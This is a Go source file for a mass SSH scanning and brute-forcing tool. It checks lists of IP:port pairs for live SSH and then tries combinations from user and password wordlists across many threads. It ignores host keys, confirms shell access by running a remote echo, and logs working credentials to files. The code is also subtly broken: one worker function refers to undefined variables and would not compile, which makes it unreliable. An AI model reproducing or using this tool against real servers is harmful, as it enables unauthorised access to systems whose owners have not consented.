package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

type StatsCracker struct {
	SuccessCount      int
	GoodWithAccess    int
	GoodWithoutAccess int
	TotalAttempts     int
	TotalPossible     int
	StartTime         time.Time
	AttemptsHistory   sync.Map
	SuccessfulCombos  sync.Map
	BlockedIPs        sync.Map
}

type StatsChecker struct {
	GoodCount     int
	BadCount      int
	TotalChecked  int
	TotalPossible int
	StartTime     time.Time
	sync.Mutex
}

type CrackerState struct {
	IPFile         string
	UserFile       string
	PassFile       string
	KeyPath        string
	NumThreads     int
	Timeout        time.Duration
	Delay          time.Duration
	Stats          StatsCracker
	CurrentUserIdx int
	CurrentPassIdx int
	CurrentIPIdx   int
}

type CheckerState struct {
	IPFile     string
	NumThreads int
	BatchSize  int
	Stats      StatsChecker
	CurrentIdx int
}

const (
	maxAttemptsPerIP = 500000000
	retryLimit       = 1
	creatorName      = "@HEXMOSTAFA"
	crackerStateFile = "cracker_state.json"
	checkerStateFile = "checker_state.json"
)

var (
	green = color.New(color.FgGreen).SprintFunc()
	cyan  = color.New(color.FgCyan).SprintFunc()
)

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func getInput(prompt string) string {
	fmt.Print(prompt)
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	return strings.TrimSpace(scanner.Text())
}

func validateIPPort(ipPort string) bool {
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return false
	}
	_, err := strconv.Atoi(parts[1])
	return err == nil
}

func readLines(filepath string) ([]string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, fmt.Errorf("failed to open file %s: %v", filepath, err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func max(nums ...int) int {
	if len(nums) == 0 {
		return 0
	}
	maxVal := nums[0]
	for _, num := range nums {
		if num > maxVal {
			maxVal = num
		}
	}
	return maxVal
}

func setupDirectories() error {
	dirs := []string{
		"results/checker",
		"results/cracker",
	}
	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("failed to create directory %s: %v", dir, err)
		}
	}
	return nil
}

func saveCrackerState(state CrackerState) error {
	data, err := json.Marshal(state)
	if err != nil {
		return err
	}
	return os.WriteFile(crackerStateFile, data, 0644)
}

func loadCrackerState() (CrackerState, bool) {
	var state CrackerState
	data, err := os.ReadFile(crackerStateFile)
	if err != nil {
		return state, false
	}
	err = json.Unmarshal(data, &state)
	return state, err == nil
}

func saveCheckerState(state CheckerState) error {
	data, err := json.Marshal(state)
	if err != nil {
		return err
	}
	return os.WriteFile(checkerStateFile, data, 0644)
}

func loadCheckerState() (CheckerState, bool) {
	var state CheckerState
	data, err := os.ReadFile(checkerStateFile)
	if err != nil {
		return state, false
	}
	err = json.Unmarshal(data, &state)
	return state, err == nil
}

func displayStatus(ctx context.Context, toolName string, stats interface{}, params map[string]string) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			var elapsed time.Duration
			var speed float64
			var remainingTime time.Duration
			var totalAttempts, totalPossible int
			var successStats []string

			switch s := stats.(type) {
			case *StatsCracker:
				elapsed = time.Since(s.StartTime)
				speed = float64(s.TotalAttempts) / elapsed.Seconds()
				remainingAttempts := float64(s.TotalPossible - s.TotalAttempts)
				if speed > 0 {
					remainingTime = time.Duration(remainingAttempts/speed) * time.Second
				} else {
					remainingTime = time.Duration(remainingAttempts) * time.Second
				}
				totalAttempts = s.TotalAttempts
				totalPossible = s.TotalPossible
				successStats = []string{
					fmt.Sprintf("%d", s.SuccessCount),
					fmt.Sprintf("%d", s.GoodWithAccess),
					fmt.Sprintf("%d", s.GoodWithoutAccess),
				}
			case *StatsChecker:
				elapsed = time.Since(s.StartTime)
				speed = float64(s.TotalChecked) / elapsed.Seconds()
				remainingChecks := float64(s.TotalPossible - s.TotalChecked)
				if speed > 0 {
					remainingTime = time.Duration(remainingChecks/speed) * time.Second
				} else {
					remainingTime = time.Duration(remainingChecks) * time.Second
				}
				totalAttempts = s.TotalChecked
				totalPossible = s.TotalPossible
				successStats = []string{
					"",
					fmt.Sprintf("%d", s.GoodCount),
					fmt.Sprintf("%d", s.BadCount),
				}
			}

			ipFileValue := params["ipFile"]
			userFileValue := params["userFile"]
			passFileValue := params["passFile"]
			threadsValue := params["threads"]
			keyValue := params["key"]
			if keyValue == "" {
				keyValue = "None"
			}

			attemptsValue := fmt.Sprintf("%d/%d", totalAttempts, totalPossible)
			speedValue := fmt.Sprintf("%.2f IP/s", speed)
			elapsedTimeValue := elapsed.Truncate(time.Second).String()
			remainingTimeValue := remainingTime.Truncate(time.Second).String()
			totalSuccessValue := successStats[0]
			goodWithAccessValue := successStats[1]
			goodWithoutAccessValue := successStats[2]

			ipFileLabel := "📄 IP File"
			userFileLabel := "👤 User File"
			passFileLabel := "🔑 Pass File"
			threadsLabel := "🧵  Threads"
			keyLabel := "🔑 SSH Key"
			attemptsLabel := "Attempts"
			speedLabel := "Speed"
			elapsedTimeLabel := "Elapsed Time"
			remainingTimeLabel := "Remaining Time"
			totalSuccessLabel := "Total Success"
			goodWithAccessLabel := "Good with Access"
			goodWithoutAccessLabel := "Good w/o Access"
			goodsLabel := "Goods"
			badsLabel := "Bads"

			maxLabelWidth := 0
			if toolName == "SSH Cracker" {
				maxLabelWidth = max(
					len(ipFileLabel), len(userFileLabel), len(passFileLabel), len(threadsLabel),
					len(keyLabel), len(attemptsLabel), len(speedLabel), len(elapsedTimeLabel),
					len(remainingTimeLabel), len(totalSuccessLabel), len(goodWithAccessLabel), len(goodWithoutAccessLabel),
				)
			} else {
				maxLabelWidth = max(
					len(ipFileLabel), len(threadsLabel), len(attemptsLabel), len(speedLabel),
					len(elapsedTimeLabel), len(remainingTimeLabel), len(goodsLabel), len(badsLabel),
				)
			}
			maxValueWidth := max(
				len(ipFileValue), len(userFileValue), len(passFileValue), len(threadsValue),
				len(keyValue), len(attemptsValue), len(speedValue), len(elapsedTimeValue),
				len(remainingTimeValue), len(totalSuccessValue), len(goodWithAccessValue), len(goodWithoutAccessValue),
			)

			ipFileLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, ipFileLabel)
			userFileLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, userFileLabel)
			passFileLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, passFileLabel)
			threadsLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, threadsLabel)
			keyLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, keyLabel)
			attemptsLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, attemptsLabel)
			speedLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, speedLabel)
			elapsedTimeLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, elapsedTimeLabel)
			remainingTimeLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, remainingTimeLabel)
			totalSuccessLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, totalSuccessLabel)
			goodWithAccessLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, goodWithAccessLabel)
			goodWithoutAccessLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, goodWithoutAccessLabel)
			goodsLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, goodsLabel)
			badsLabelPadded := fmt.Sprintf("%-*s", maxLabelWidth, badsLabel)

			ipFilePadded := fmt.Sprintf("%-*s", maxValueWidth, ipFileValue)
			userFilePadded := fmt.Sprintf("%-*s", maxValueWidth, userFileValue)
			passFilePadded := fmt.Sprintf("%-*s", maxValueWidth, passFileValue)
			threadsPadded := fmt.Sprintf("%-*s", maxValueWidth, threadsValue)
			keyPadded := fmt.Sprintf("%-*s", maxValueWidth, keyValue)
			attemptsPadded := fmt.Sprintf("%-*s", maxValueWidth, attemptsValue)
			speedPadded := fmt.Sprintf("%-*s", maxValueWidth, speedValue)
			elapsedTimePadded := fmt.Sprintf("%-*s", maxValueWidth, elapsedTimeValue)
			remainingTimePadded := fmt.Sprintf("%-*s", maxValueWidth, remainingTimeValue)
			totalSuccessPadded := fmt.Sprintf("%-*s", maxValueWidth, totalSuccessValue)
			goodWithAccessPadded := fmt.Sprintf("%-*s", maxValueWidth, goodWithAccessValue)
			goodWithoutAccessPadded := fmt.Sprintf("%-*s", maxValueWidth, goodWithoutAccessValue)

			colWidth := maxValueWidth + 2
			labelColWidth := maxLabelWidth + 2
			totalWidth := labelColWidth + colWidth + 3
			firstLineTotalWidth := totalWidth - 1
			lastLineTotalWidth := totalWidth - 1

			fmt.Printf("\033[H\033[2J")
			fmt.Printf("╔%s╗\n", strings.Repeat("═", firstLineTotalWidth))
			fmt.Printf("║ %s : %-*s  ║\n", "CREATED BY", totalWidth-17, creatorName)
			fmt.Printf("╠%s╦%s╣\n", strings.Repeat("═", labelColWidth-1), strings.Repeat("═", colWidth))

			fmt.Printf("║ %s : %s ║\n", ipFileLabelPadded, ipFilePadded)
			if toolName == "SSH Cracker" {
				fmt.Printf("║ %s : %s ║\n", userFileLabelPadded, userFilePadded)
				fmt.Printf("║ %s : %s ║\n", passFileLabelPadded, passFilePadded)
			}
			fmt.Printf("║ %s : %s ║\n", threadsLabelPadded, threadsPadded)
			if toolName == "SSH Cracker" {
				fmt.Printf("║ %s : %s ║\n", keyLabelPadded, keyPadded)
			}

			fmt.Printf("╠%s╩%s╣\n", strings.Repeat("═", labelColWidth-1), strings.Repeat("═", colWidth))

			fmt.Printf("║ %s : %s ║\n", attemptsLabelPadded, attemptsPadded)
			fmt.Printf("║ %s : %s ║\n", speedLabelPadded, speedPadded)
			fmt.Printf("║ %s : %s ║\n", elapsedTimeLabelPadded, elapsedTimePadded)
			fmt.Printf("║ %s : %s ║\n", remainingTimeLabelPadded, remainingTimePadded)
			if toolName == "SSH Cracker" {
				fmt.Printf("║ %s : %s ║\n", totalSuccessLabelPadded, totalSuccessPadded)
			}
			if toolName == "SSH Checker" {
				fmt.Printf("║ %s : %s ║\n", goodsLabelPadded, goodWithAccessPadded)
				fmt.Printf("║ %s : %s ║\n", badsLabelPadded, goodWithoutAccessPadded)
			} else {
				fmt.Printf("║ %s : %s ║\n", goodWithAccessLabelPadded, goodWithAccessPadded)
				fmt.Printf("║ %s : %s ║\n", goodWithoutAccessLabelPadded, goodWithoutAccessPadded)
			}

			fmt.Printf("╚%s╝\n", strings.Repeat("═", lastLineTotalWidth))
			fmt.Print(strings.Repeat("\n", 5))
		}
	}
}

func checkSSH(ipPort string) (bool, string) {
	conn, err := net.DialTimeout("tcp", ipPort, 5*time.Second)
	if err != nil {
		return false, fmt.Sprintf("Connection failed: %v", err)
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	banner := make([]byte, 1024)
	n, err := conn.Read(banner)
	if err != nil {
		return false, fmt.Sprintf("Error reading banner: %v", err)
	}

	bannerStr := strings.TrimSpace(string(banner[:n]))
	if strings.HasPrefix(bannerStr, "SSH") {
		return true, "SSH is active"
	}
	return false, "Not an SSH service"
}

func processIP(ipPort string, goodFile, badFile *os.File, stats *StatsChecker, sem chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	defer func() { <-sem }()

	success, _ := checkSSH(ipPort)
	stats.Lock()
	defer stats.Unlock()
	stats.TotalChecked++
	if success {
		stats.GoodCount++
		writer := bufio.NewWriter(goodFile)
		writer.WriteString(ipPort + "\r\n")
		writer.Flush()
	} else {
		stats.BadCount++
		writer := bufio.NewWriter(badFile)
		writer.WriteString(ipPort + "\r\n")
		writer.Flush()
	}
}

func runChecker() {
	var stats StatsChecker
	var state CheckerState
	resume := false

	if os.Getenv("RESUME_CHECKER") == "true" {
		if loadedState, ok := loadCheckerState(); ok {
			resume = true
			state = loadedState
			stats = state.Stats
		}
	}

	var ipPortList []string
	var err error
	if !resume {
		state = CheckerState{
			IPFile:     "",
			NumThreads: 0,
			BatchSize:  0,
			Stats:      stats,
			CurrentIdx: 0,
		}
		saveCheckerState(state)

		stats.StartTime = time.Now()

		ipFile := getInput("Enter the file path for IPs (IP:Port, e.g., ip_list.txt): ")
		ipPortList, err = readLines(ipFile)
		if err != nil {
			fmt.Println("Error reading IP file:", err)
			return
		}

		for _, ipPort := range ipPortList {
			if !validateIPPort(ipPort) {
				fmt.Println("Invalid IP:Port format:", ipPort)
				return
			}
		}

		maxWorkersStr := getInput("Enter the number of threads (e.g., 50): ")
		maxWorkers, err := strconv.Atoi(maxWorkersStr)
		if err != nil || maxWorkers <= 0 {
			fmt.Println("Please enter a positive number!")
			return
		}

		batchSizeStr := getInput("Enter the batch size (e.g., 1000): ")
		batchSize, err := strconv.Atoi(batchSizeStr)
		if err != nil || batchSize <= 0 {
			fmt.Println("Please enter a positive number!")
			return
		}

		stats.TotalPossible = len(ipPortList)
		state = CheckerState{
			IPFile:     ipFile,
			NumThreads: maxWorkers,
			BatchSize:  batchSize,
			Stats:      stats,
			CurrentIdx: 0,
		}

		goodFile, err := os.Create("results/checker/good.txt")
		if err != nil {
			fmt.Println("Error creating results/checker/good.txt:", err)
			return
		}
		goodFile.Close()

		badFile, err := os.Create("results/checker/bad.txt")
		if err != nil {
			fmt.Println("Error creating results/checker/bad.txt:", err)
			return
		}
		badFile.Close()

		saveCheckerState(state)
	} else {
		ipPortList, err = readLines(state.IPFile)
		if err != nil {
			fmt.Println("Error reading IP file from state:", err)
			return
		}
	}

	goodFile, err := os.OpenFile("results/checker/good.txt", os.O_APPEND|os.O_WRONLY, 0666)
	if err != nil {
		fmt.Println("Error opening results/checker/good.txt:", err)
		return
	}
	defer goodFile.Close()

	badFile, err := os.OpenFile("results/checker/bad.txt", os.O_APPEND|os.O_WRONLY, 0666)
	if err != nil {
		fmt.Println("Error opening results/checker/bad.txt:", err)
		return
	}
	defer badFile.Close()

	sem := make(chan struct{}, state.NumThreads)
	var wg sync.WaitGroup
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	params := map[string]string{
		"ipFile":  state.IPFile,
		"threads": strconv.Itoa(state.NumThreads),
	}

	go displayStatus(ctx, "SSH Checker", &stats, params)

	for i := state.CurrentIdx; i < len(ipPortList); i += state.BatchSize {
		end := i + state.BatchSize
		if end > len(ipPortList) {
			end = len(ipPortList)
		}
		batch := ipPortList[i:end]
		for _, ipPort := range batch {
			wg.Add(1)
			sem <- struct{}{}
			go processIP(ipPort, goodFile, badFile, &stats, sem, &wg)
		}
		wg.Wait()
		state.CurrentIdx = end
		state.Stats = stats
		saveCheckerState(state)
	}

	cancel()
	time.Sleep(100 * time.Millisecond)
	os.Remove(checkerStateFile)
	fmt.Printf("\n%s Check completed! Results saved in 'results/checker/good.txt' and 'results/checker/bad.txt'.\n", green("✔"))
	fmt.Printf("%s Found %d good IPs with active SSH.\n", green("✔"), stats.GoodCount)
	fmt.Println("Press Enter to return to menu.")
	bufio.NewReader(os.Stdin).ReadString('\n')
}

func loadSSHKey(keyPath string) (ssh.AuthMethod, error) {
	if keyPath == "" {
		return nil, nil
	}
	keyData, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read SSH key: %v", err)
	}
	signer, err := ssh.ParsePrivateKey(keyData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse SSH key: %v", err)
	}
	return ssh.PublicKeys(signer), nil
}

func checkSSHSuccess(ipPort, user, password, keyPath string, timeout time.Duration) (bool, string) {
	keyAuth, err := loadSSHKey(keyPath)
	if err != nil {
		return false, fmt.Sprintf("failed to load SSH key: %v", err)
	}

	var authMethods []ssh.AuthMethod
	if password != "" {
		authMethods = append(authMethods, ssh.Password(password))
	}
	if keyAuth != nil {
		authMethods = append(authMethods, keyAuth)
	}

	config := &ssh.ClientConfig{
		User:            user,
		Auth:            authMethods,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}

	conn, err := net.DialTimeout("tcp", ipPort, timeout)
	if err != nil {
		return false, err.Error()
	}
	defer conn.Close()

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, ipPort, config)
	if err != nil {
		return false, err.Error()
	}
	defer sshConn.Close()

	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return false, err.Error()
	}
	defer session.Close()

	return true, "Connected"
}

func checkEcho(ipPort, user, password, keyPath string, timeout time.Duration) (bool, string) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	output, err := executeRemoteCommandWithTimeout(ctx, ipPort, user, password, keyPath, "echo TEST", timeout)
	if err != nil {
		return false, fmt.Sprintf("Error: %v", err)
	}

	trimmedOutput := strings.TrimSpace(string(output))
	if trimmedOutput == "test" || trimmedOutput == "TEST" {
		return true, trimmedOutput
	}
	return false, trimmedOutput
}

func executeRemoteCommandWithTimeout(ctx context.Context, ipPort, user, password, keyPath, command string, timeout time.Duration) ([]byte, error) {
	keyAuth, err := loadSSHKey(keyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load SSH key: %v", err)
	}

	var authMethods []ssh.AuthMethod
	if password != "" {
		authMethods = append(authMethods, ssh.Password(password))
	}
	if keyAuth != nil {
		authMethods = append(authMethods, keyAuth)
	}

	config := &ssh.ClientConfig{
		User:            user,
		Auth:            authMethods,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}

	conn, err := net.DialTimeout("tcp", ipPort, timeout)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %v", err)
	}
	defer conn.Close()

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, ipPort, config)
	if err != nil {
		return nil, fmt.Errorf("SSH connection failed: %v", err)
	}
	defer sshConn.Close()

	client := ssh.NewClient(sshConn, chans, reqs)
	if client == nil {
		return nil, fmt.Errorf("client creation failed")
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return nil, fmt.Errorf("session creation failed: %v", err)
	}
	defer session.Close()

	outputChan := make(chan []byte)
	errChan := make(chan error)

	go func() {
		output, err := session.CombinedOutput(command)
		if err != nil {
			errChan <- err
		} else {
			outputChan <- output
		}
	}()

	select {
	case output := <-outputChan:
		return output, nil
	case err := <-errChan:
		return nil, err
	case <-ctx.Done():
		return nil, fmt.Errorf("command timed out after 10 seconds")
	}
}

func writeToFile(filename, content string) error {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		return fmt.Errorf("error opening %s: %v", filename, err)
	}
	defer file.Close()
	writer := bufio.NewWriter(file)
	if _, err := writer.WriteString(content + "\r\n"); err != nil {
		return err
	}
	return writer.Flush()
}

func bruteForceWorker(ctx context.Context, ipPort, user, password, keyPath string, timeout, delay time.Duration, stats *StatsCracker, sem chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	defer func() { <-sem }()

	ip := strings.Split(ipPort, ":")[0]
	attemptKey := fmt.Sprintf("%s|%s", ip, user)
	successKey := fmt.Sprintf("%s|%s", ipPort, user)

	if _, blocked := stats.BlockedIPs.Load(ip); blocked {
		return
	}
	if _, exists := stats.SuccessfulCombos.Load(successKey); exists {
		return
	}

	attempts, loaded := stats.AttemptsHistory.Load(attemptKey)
	if loaded && attempts.(int) >= maxAttemptsPerIP {
		return
	}

	attemptsInt := 1
	if loaded {
		attemptsInt = attempts.(int) + 1
	}
	stats.AttemptsHistory.Store(attemptKey, attemptsInt)
	stats.TotalAttempts++

	success, _ := checkSSHSuccess(ipPort, user, password, keyPath, timeout)
	result := fmt.Sprintf("%s | %s | %s", ipPort, user, password)
	if success {
		stats.SuccessCount++
		echoSuccess, echoOutput := checkEcho(ipPort, user, password, keyPath, timeout)
		if echoSuccess {
			stats.GoodWithAccess++
			writeToFile("results/cracker/good_access.txt", result)
			stats.SuccessfulCombos.Store(successKey, true)
		} else {
			stats.GoodWithoutAccess++
			writeToFile("results/cracker/good_non_access.txt", fmt.Sprintf("%s | Echo: %s", result, echoOutput))
			stats.BlockedIPs.Store(ip, true)
			// کاهش TotalPossible با حذف ترکیب‌های این IP
			stats.TotalPossible -= (len(stats.AttemptsHistory) * (len(users) * len(passwords)))
		}
	}

	if delay > 0 {
		select {
		case <-ctx.Done():
			return
		case <-time.After(delay):
		}
	}
}

func clearCrackerFiles() {
	if err := os.MkdirAll("results/cracker", 0755); err != nil {
		fmt.Printf("Error creating directory results/cracker: %v\n", err)
		return
	}

	files := []string{
		"results/cracker/good_access.txt",
		"results/cracker/good_non_access.txt",
	}
	for _, file := range files {
		if err := os.Remove(file); err != nil && !os.IsNotExist(err) {
			fmt.Printf("Error removing %s: %v\n", file, err)
			continue
		}
		if _, err := os.Create(file); err != nil {
			fmt.Printf("Error creating %s: %v\n", file, err)
		}
	}
}

func runCracker() {
	var stats StatsCracker
	var state CrackerState
	resume := false

	if os.Getenv("RESUME_CRACKER") == "true" {
		if loadedState, ok := loadCrackerState(); ok {
			resume = true
			state = loadedState
			stats = state.Stats
		}
	}

	var ips, users, passwords []string
	var err error
	if !resume {
		state = CrackerState{
			IPFile:         "",
			UserFile:       "",
			PassFile:       "",
			KeyPath:        "",
			NumThreads:     0,
			Timeout:        0,
			Delay:          0,
			Stats:          stats,
			CurrentUserIdx: 0,
			CurrentPassIdx: 0,
			CurrentIPIdx:   0,
		}
		saveCrackerState(state)

		clearCrackerFiles()

		ipFile := getInput("File with IPs (IP:Port): ")
		userFile := getInput("File with Users: ")
		passFile := getInput("File with Passwords: ")
		keyPath := getInput("Path to SSH key (optional, press Enter to skip): ")

		numThreadsStr := getInput("Number of threads: ")
		numThreads, err := strconv.Atoi(numThreadsStr)
		if err != nil || numThreads <= 0 {
			fmt.Println("Invalid number of threads, must be a positive number")
			return
		}

		timeoutSecStr := getInput("Timeout (seconds): ")
		timeoutSec, err := strconv.Atoi(timeoutSecStr)
		if err != nil || timeoutSec <= 0 {
			fmt.Println("Invalid timeout, must be a positive number")
			return
		}

		delaySecStr := getInput("Delay (seconds): ")
		delaySec, err := strconv.Atoi(delaySecStr)
		if err != nil || delaySec < 0 {
			fmt.Println("Invalid delay, must be non-negative")
			return
		}

		timeout := time.Duration(timeoutSec) * time.Second
		delay := time.Duration(delaySec) * time.Second

		ips, err = readLines(ipFile)
		if err != nil {
			fmt.Println("Error reading IPs:", err)
			return
		}
		users, err = readLines(userFile)
		if err != nil {
			fmt.Println("Error reading Users:", err)
			return
		}
		passwords, err = readLines(passFile)
		if err != nil {
			fmt.Println("Error reading Passwords:", err)
			return
		}

		for _, ipPort := range ips {
			if !validateIPPort(ipPort) {
				fmt.Println("Invalid IP:Port format:", ipPort)
				return
			}
		}

		stats.TotalPossible = len(ips) * len(users) * len(passwords)
		stats.StartTime = time.Now()
		state = CrackerState{
			IPFile:         ipFile,
			UserFile:       userFile,
			PassFile:       passFile,
			KeyPath:        keyPath,
			NumThreads:     numThreads,
			Timeout:        timeout,
			Delay:          delay,
			Stats:          stats,
			CurrentUserIdx: 0,
			CurrentPassIdx: 0,
			CurrentIPIdx:   0,
		}
		saveCrackerState(state)
	} else {
		ips, err = readLines(state.IPFile)
		if err != nil {
			fmt.Println("Error reading IPs from state:", err)
			return
		}
		users, err = readLines(state.UserFile)
		if err != nil {
			fmt.Println("Error reading Users from state:", err)
			return
		}
		passwords, err = readLines(state.PassFile)
		if err != nil {
			fmt.Println("Error reading Passwords from state:", err)
			return
		}
	}

	sem := make(chan struct{}, state.NumThreads)
	var wg sync.WaitGroup
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	params := map[string]string{
		"ipFile":   state.IPFile,
		"userFile": state.UserFile,
		"passFile": state.PassFile,
		"timeout":  fmt.Sprintf("%ds", int(state.Timeout/time.Second)),
		"threads":  strconv.Itoa(state.NumThreads),
		"delay":    fmt.Sprintf("%ds", int(state.Delay/time.Second)),
		"key":      state.KeyPath,
	}

	go displayStatus(ctx, "SSH Cracker", &stats, params)

	done := false
	for i := state.CurrentUserIdx; i < len(users) && !done; i++ {
		for j := state.CurrentPassIdx; j < len(passwords) && !done; j++ {
			for k := state.CurrentIPIdx; k < len(ips) && !done; k++ {
				ipPort := ips[k]
				user := users[i]
				password := passwords[j]

				if _, blocked := stats.BlockedIPs.Load(strings.Split(ipPort, ":")[0]); blocked {
					continue
				}
				successKey := fmt.Sprintf("%s|%s", ipPort, user)
				if _, exists := stats.SuccessfulCombos.Load(successKey); exists {
					continue
				}

				wg.Add(1)
				sem <- struct{}{}
				go bruteForceWorker(ctx, ipPort, user, password, state.KeyPath, state.Timeout, state.Delay, &stats, sem, &wg)

				if stats.TotalAttempts > 0 {
					state.CurrentIPIdx = k + 1
					state.Stats = stats
					saveCrackerState(state)
				}

				if stats.TotalAttempts >= stats.TotalPossible {
					done = true
					break
				}
			}
			if done {
				break
			}
			state.CurrentIPIdx = 0
			state.CurrentPassIdx = j + 1
			state.Stats = stats
			saveCrackerState(state)
		}
		if done {
			break
		}
		state.CurrentPassIdx = 0
		state.CurrentUserIdx = i + 1
		state.Stats = stats
		saveCrackerState(state)
	}

	wg.Wait()
	cancel()
	time.Sleep(500 * time.Millisecond)

	os.Remove(crackerStateFile)
	fmt.Printf("\n%s Cracking completed! Results saved in 'results/cracker/good_access.txt' and 'results/cracker/good_non_access.txt'.\n", green("✔"))
	fmt.Printf("Total successful attempts: %d\n", stats.SuccessCount)
	fmt.Printf("Good with Access: %d\n", stats.GoodWithAccess)
	fmt.Printf("Good without Access: %d\n", stats.GoodWithoutAccess)
	fmt.Println("Press Enter to return to menu.")
	bufio.NewReader(os.Stdin).ReadString('\n')
}

func showMenu() {
	for {
		clearScreen()
		fmt.Println(cyan("╔════════════════════════════════════╗"))
		fmt.Printf("║ Created By: %-22s ║\n", creatorName)
		fmt.Println(cyan("╠════════════════════════════════════╣"))
		fmt.Println("║ 1. SSH Checker                     ║")
		fmt.Println("║ 2. SSH Cracker                     ║")

		hasCheckerState, hasCrackerState := false, false
		if _, ok := loadCheckerState(); ok {
			hasCheckerState = true
		}
		if _, ok := loadCrackerState(); ok {
			hasCrackerState = true
		}

		if hasCheckerState || hasCrackerState {
			fmt.Println("║ 3. Resume Previous Operation       ║")
			fmt.Println("║ 4. Exit                            ║")
		} else {
			fmt.Println("║ 3. Exit                            ║")
		}
		fmt.Println(cyan("╚════════════════════════════════════╝"))

		choice := getInput("Select an option: ")

		if hasCheckerState || hasCrackerState {
			switch choice {
			case "1":
				os.Remove(checkerStateFile)
				runChecker()
			case "2":
				os.Remove(crackerStateFile)
				runCracker()
			case "3":
				if hasCheckerState {
					os.Setenv("RESUME_CHECKER", "true")
					runChecker()
					os.Unsetenv("RESUME_CHECKER")
				} else if hasCrackerState {
					os.Setenv("RESUME_CRACKER", "true")
					runCracker()
					os.Unsetenv("RESUME_CRACKER")
				}
			case "4":
				os.Remove(checkerStateFile)
				os.Remove(crackerStateFile)
				fmt.Println("Goodbye!")
				return
			default:
				fmt.Println("Invalid option! Press Enter to try again.")
				bufio.NewReader(os.Stdin).ReadString('\n')
			}
		} else {
			switch choice {
			case "1":
				os.Remove(checkerStateFile)
				runChecker()
			case "2":
				os.Remove(crackerStateFile)
				runCracker()
			case "3":
				os.Remove(checkerStateFile)
				os.Remove(crackerStateFile)
				fmt.Println("Goodbye!")
				return
			default:
				fmt.Println("Invalid option! Press Enter to try again.")
				bufio.NewReader(os.Stdin).ReadString('\n')
			}
		}
	}
}

func main() {
	fmt.Printf("Welcome to SSH Tools by %s\n", creatorName)
	if err := setupDirectories(); err != nil {
		fmt.Printf("Failed to set up directories: %v\n", err)
		fmt.Println("Press Enter to exit.")
		bufio.NewReader(os.Stdin).ReadString('\n')
		return
	}
	showMenu()
}
